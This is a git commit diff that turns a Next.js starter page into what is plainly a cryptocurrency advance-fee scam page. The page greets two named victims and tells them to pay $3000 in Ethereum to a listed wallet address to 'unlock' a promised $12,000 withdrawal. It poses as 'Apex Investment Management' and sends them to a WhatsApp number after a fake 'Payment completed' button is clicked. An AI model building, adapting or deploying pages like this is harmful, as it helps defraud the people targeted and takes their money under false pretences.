1c7a6156fb9c09e15b6ce8c6367c32109d7b23c1
pero4l <lilpero03@gmail.com>
2025-12-10 13:56:04 +0100

    inital commit

--- app/page.tsx
+++ app/page.tsx
@@ -1,65 +1,45 @@
-import Image from "next/image";
+"use client"
 
+import Image from "next/image";
+import { useState } from "react";
+import image from "@/public/basics-of-blockchain-explained-in-easy-terms.webp"
+import logo from "@/app/favicon.ico"
+import { useRouter } from "next/navigation";
 export default function Home() {
+
+const [isClick, setIsClick] = useState(false)
+const router = useRouter()
+
+ const ref = () =>{
+    setIsClick(!isClick)
+    setTimeout(() => {
+      router.push("https://wa.me/4571447586")
+    }, 3000);
+ }
+
   return (
-    <div className="flex min-h-screen items-center justify-center bg-zinc-50 font-sans dark:bg-black">
-      <main className="flex min-h-screen w-full max-w-3xl flex-col items-center justify-between py-32 px-16 bg-white dark:bg-black sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={100}
-          height={20}
-          priority
-        />
-        <div className="flex flex-col items-center gap-6 text-center sm:items-start sm:text-left">
-          <h1 className="max-w-xs text-3xl font-semibold leading-10 tracking-tight text-black dark:text-zinc-50">
-            To get started, edit the page.tsx file.
-          </h1>
-          <p className="max-w-md text-lg leading-8 text-zinc-600 dark:text-zinc-400">
-            Looking for a starting point or more instructions? Head over to{" "}
-            <a
-              href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Templates
-            </a>{" "}
-            or the{" "}
-            <a
-              href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Learning
-            </a>{" "}
-            center.
-          </p>
-        </div>
-        <div className="flex flex-col gap-4 text-base font-medium sm:flex-row">
-          <a
-            className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-foreground px-5 text-background transition-colors hover:bg-[#383838] dark:hover:bg-[#ccc] md:w-[158px]"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={16}
-              height={16}
-            />
-            Deploy Now
-          </a>
-          <a
-            className="flex h-12 w-full items-center justify-center rounded-full border border-solid border-black/[.08] px-5 transition-colors hover:border-transparent hover:bg-black/[.04] dark:border-white/[.145] dark:hover:bg-[#1a1a1a] md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Documentation
-          </a>
-        </div>
-      </main>
+    <div className="bg-gray-900 min-h-screen text-white font-bold">
+      <div className="flex justify-center gap-1 items-center pb-3">
+        <Image className="w-9 h-10" src={logo} alt="" />
+        <h1 className="text-center text-[23px] font-mono text-blue-400 pt-5">UNLOCK YOUR BLOCKCHIAN</h1>
+        
+
+      </div>
+
+      <Image className="px-2" src={image} alt="" />
+
+      
+      <div className="p-3 font-mono">
+        <h1 className="text-center text-xl text-white pb-5 font-serif">Welcome Mr Heinz and Mrs Karianne</h1>
+        <p>To unlock your blockchain you'll have to pay the sum of $3000 worth of Etherum(ETH) to our company wallet address. When the payment is done successfully, then click on the <em><b>Payment completed button below</b></em> and then send the transaction screenshot to our whatsapp channel for comfirmation.</p>
+
+        <p>When we comfirm your payment then you withdrawal of $12,000 will be sent to the wallet address you provide.</p>
+        <p className="pt-2"><em>Thank you so much for choosing Apex Investment Management as your number one investment platform.</em></p>
+
+        <p className="pt-10 underline">Company wallet address: <span className="text-[13px]">0x3535b244A990Ac7Fbaa4f20313fe9d393F2eD68C</span></p>
+
+        <div className="flex justify-center pt-4"><button onClick={ref} className={`border p-3 ${isClick ? "bg-green-600 hover-bg-green-400" : "bg-gray-600 hover-bg-gray-400"} rounded-xl`}>{isClick ? "Pending comfirmation...": "Payment completed"}</button></div>
+      </div>
     </div>
   );
 }
